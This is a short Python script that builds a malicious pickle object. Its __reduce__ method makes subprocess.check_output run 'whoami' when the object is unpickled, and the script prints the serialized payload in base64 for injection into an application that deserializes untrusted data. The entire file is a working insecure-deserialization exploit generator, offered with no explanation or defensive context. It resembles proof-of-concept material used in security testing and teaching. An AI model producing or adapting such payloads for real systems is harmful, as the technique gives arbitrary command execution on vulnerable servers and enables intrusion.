import pickle
import subprocess
import base64

class Inject(object):
    def __reduce__(self):  
        return (subprocess.check_output, (['whoami'],))

serialize = pickle.dumps(Inject())
print(base64.b64encode(serialize))